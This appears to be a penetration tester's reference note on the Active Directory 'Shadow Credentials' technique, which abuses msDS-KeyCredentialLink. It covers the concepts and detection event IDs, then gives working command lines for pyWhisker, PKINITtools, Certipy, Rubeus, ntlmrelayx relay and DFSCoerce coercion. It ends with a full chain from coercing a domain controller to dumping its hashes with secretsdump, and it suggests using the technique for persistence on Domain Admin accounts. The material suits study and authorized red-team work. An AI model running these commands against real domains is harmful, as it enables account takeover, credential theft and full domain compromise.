# 📌 Shadow Credentials

> Inject your own public key into an AD account's authentication attribute — then authenticate as that account forever using PKINIT, even after password resets.

---

## 🔍 Definition

Shadow Credentials is an AD persistence and privilege escalation technique that abuses the **`msDS-KeyCredentialLink`** attribute on user and computer objects. This attribute was introduced in Windows Server 2016 for passwordless authentication (Windows Hello for Business / Key Trust PKINIT). If an attacker has **write access to this attribute** on a target account, they can inject their own public key — the account then trusts that key for PKINIT authentication. The attacker can then get a TGT as that account **without knowing the password** and **survives password resets**.

Discovered by Elad Shamir at SpecterOps and released alongside Whisker tooling. BloodHound edge: **AddKeyCredentialLink**.

---

## 🧠 Core Concepts

- **msDS-KeyCredentialLink** — multi-valued AD attribute on user/computer objects. Stores public keys for PKINIT Key Trust authentication. Normally set by Windows Hello for Business enrollment
- **PKINIT (Key Trust)** — Kerberos pre-authentication using asymmetric keys instead of a password hash. KDC validates client's public key against `msDS-KeyCredentialLink`. If match → TGT issued
- **Shadow Credentials** — attacker-injected public keys in this attribute. Acts as a backdoor auth method alongside the regular password
- **Requirements:**
  - DC must be Windows Server 2016+
  - DC must have a server authentication certificate (for session key exchange) — typically provided by AD CS
  - Attacker needs write rights to `msDS-KeyCredentialLink` on target
- **Write rights sources** — `GenericAll`, `GenericWrite`, `WriteProperty`, `WriteAccountRestrictions` on the target object. BloodHound maps these as `AddKeyCredentialLink`
- **Computer objects** — can edit their own `msDS-KeyCredentialLink` if no KeyCredential is already set. This enables computer self-relay scenarios
- **User objects** — cannot edit their own attribute. Must have been explicitly granted write rights
- **UnPAC-the-hash** — use the PKINIT TGT to extract the account's NTLM hash via the PA-DATA field (U2U protocol). Now you have a hash for PtH even if you never cracked a password
- **pyWhisker** — main Python tool for Shadow Credentials from Kali. ntlmrelayx has native pyWhisker `--shadow-credentials` integration

---

## ⚙️ How It Works

1. Attacker has `GenericWrite` (or equivalent) on target user/computer
2. Attacker generates a public-private key pair locally
3. Attacker injects public key into `msDS-KeyCredentialLink` of the target
4. Attacker performs PKINIT AS-REQ using the private key → KDC finds matching public key in the attribute → issues TGT
5. Attacker uses TGT to access resources as the target account
6. Optionally: extract NTLM hash via UnPAC → use for Pass-the-Hash

**The injected key persists** — even if the target user changes their password, the Shadow Credential still authenticates. Remove it to clean up after the attack.

> 💡 For computer accounts (e.g., a DC), Shadow Credentials = persistent DC machine account access = DCSync at any time.

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| msDS-KeyCredentialLink | Attribute storing public keys for Key Trust PKINIT |
| Key Credential | Serialized object in the attribute: DeviceID, creation date, public key |
| PKINIT Key Trust | KDC validates raw public key from attribute instead of using a certificate |
| pyWhisker | Python tool to add/list/remove Shadow Credentials |
| Whisker | C# Windows-side equivalent |
| Certipy shadow | Certipy has built-in Shadow Credentials module |
| gettgtpkinit.py | PKINITtools script to request TGT via PKINIT from Linux |
| UnPAC-the-hash | Get NTLM hash from PKINIT TGT via U2U protocol |
| AddKeyCredentialLink | BloodHound edge indicating Shadow Credentials write access |
| Event ID 5136 | Directory object modified — triggered when `msDS-KeyCredentialLink` is changed |
| Event ID 4768 | TGT requested via PKINIT — detection signal |

---

## 🔥 Important Details & Gotchas

- **Requires AD CS for DC cert** — if no CA is in the environment, PKINIT won't work and the technique fails. Check for AD CS first
- **Computer objects can self-relay** — trigger a machine account to authenticate to you (coercion), relay to LDAP, write its own `msDS-KeyCredentialLink`. Result: DC cert-based auth → DCSync. See [[Authentication Coercion (PrinterBug, PetitPotam)]]
- **Only one KeyCredential slot for computer self-editing** — computer objects can only write their own attribute if it's empty. If something's already there, they can't. Users with write rights can always overwrite
- **Cleanup is critical** — leaving your public key in `msDS-KeyCredentialLink` is detectable. After the attack, list keys and remove yours: `pywhisker remove`
- **BloodHound surfaces this immediately** — any node with `AddKeyCredentialLink` edge to a high-value target (DA, DC computer object) is a Shadow Credentials path
- **Password reset doesn't invalidate it** — that's the whole point. Even after the account password is reset, your key is still trusted. Combine with targeted persistence on DA accounts
- **gettgtpkinit failures** — `KDC_ERR_PADATA_TYPE_NOSUPP` means PKINIT is not supported on this KDC or the DC certificate is missing. Some environments reject PKINIT from non-native clients. Metasploit's `kerberos/get_ticket` module often works as a fallback

---

## 🌍 Real-World Usage / Examples

**Find accounts with AddKeyCredentialLink rights (BloodHound):**
```
In BloodHound: Search for "AddKeyCredentialLink" edges from owned principals
Or: Shortest Paths to Domain Admins → look for this edge
```

**pyWhisker — inject Shadow Credential:**
```bash
# Add your public key to target user
python3 pywhisker.py -d corp.local -u lowpriv -p pass \
  --target victimuser --action add

# Output:
# [+] KeyCredential generated with DeviceID: xxxxxxxx-xxxx
# [+] Shadow credentials successfully pushed!
# [!] Use the following Rubeus command:
# .\Rubeus.exe asktgt /user:victimuser /certificate:<base64> /password:<pfx_pass> /domain:corp.local /ptt

# List existing keys on the target
python3 pywhisker.py -d corp.local -u lowpriv -p pass \
  --target victimuser --action list

# Remove a specific key (cleanup)
python3 pywhisker.py -d corp.local -u lowpriv -p pass \
  --target victimuser --action remove --device-id <DEVICE_ID>
```

**Get TGT using the injected key (PKINITtools):**
```bash
# gettgtpkinit.py
python3 gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass <pfx_password> \
  corp.local/victimuser victimuser.ccache

export KRB5CCNAME=victimuser.ccache
klist
```

**Extract NTLM hash via UnPAC-the-hash:**
```bash
python3 getnthash.py -key <session_key_from_gettgtpkinit> \
  corp.local/victimuser
# Returns NT hash → use for PtH
```

**Certipy (all-in-one — Shadow Credentials + PKINIT + UnPAC):**
```bash
# Auto-add, authenticate, get NT hash in one chain
certipy shadow auto -u lowpriv@corp.local -p pass \
  -account victimuser -dc-ip <DC-IP>
# Output: NT hash for victimuser
```

**Rubeus (Windows — after pyWhisker injection):**
```cmd
# pyWhisker gives you the exact command:
.\Rubeus.exe asktgt /user:victimuser /certificate:<base64_pfx> \
  /password:<pfx_pass> /domain:corp.local /ptt /dc:<DC>

# Extract NT hash after getting TGT
.\Rubeus.exe changepw /ticket:<base64_tgt> /targetuser:victimuser /new:'' /nodelay
```

**ntlmrelayx integrated Shadow Credentials (relay to LDAP):**
```bash
# During NTLM relay to LDAP, auto-set Shadow Creds on relayed account
impacket-ntlmrelayx -t ldap://<DC-IP> -smb2support \
  --shadow-credentials --shadow-target victimuser

# Relay a coerced auth or captured hash → Shadow Creds auto-set
```

**Full DC takeover chain (coerce DC → relay → Shadow Creds → DCSync):**
```bash
# Terminal 1: Relay to DC LDAP, target DC$ computer object
impacket-ntlmrelayx -t ldap://<DC-IP> -smb2support \
  --shadow-credentials --shadow-target DC01$

# Terminal 2: Coerce DC to authenticate to you
python3 dfscoerce.py -u user -p pass -d corp.local <LHOST-IP> <DC-FQDN>

# ntlmrelayx injects key into DC01$ msDS-KeyCredentialLink
# Then: PKINIT as DC01$ → UnPAC → NT hash → DCSync
certipy shadow auto -u lowpriv@corp.local -p pass -account DC01$ -dc-ip <DC-IP>
impacket-secretsdump -hashes :DC01_nthash corp.local/DC01$@<DC-FQDN>
```

---

## 🔗 Related Topics

- [[Active Directory (AD)]]
- [[Kerberos Authentication]]
- [[AD Certificate Services (AD CS)]]
- [[Authentication Coercion (PrinterBug, PetitPotam)]]
- [[BloodHound & Attack Path Analysis]]
- [[NTLM and Pass-the-Hash]]
- [[Lateral Movement]]

---

## 📚 Sources / Further Reading

- [SpecterOps — Shadow Credentials (Elad Shamir)](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) — original research
- [The Hacker Recipes — Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials) — clean exploitation flow
- [HackingArticles — Shadow Credentials Attack (Feb 2025)](https://www.hackingarticles.in/shadow-credentials-attack/) — step-by-step with lab
- [I-Tracing — DACL + Shadow Credentials](https://i-tracing.com/blog/dacl-shadow-credentials/) — GenericWrite → Shadow Creds path breakdown
- [BloodHound — AddKeyCredentialLink Edge](https://bloodhound.specterops.io/resources/edges/add-key-credential-link) — official docs
- pyWhisker: `https://github.com/ShutdownRepo/pywhisker`
- PKINITtools: `https://github.com/dirkjanm/PKINITtools`
- Certipy shadow: `certipy shadow auto -h`
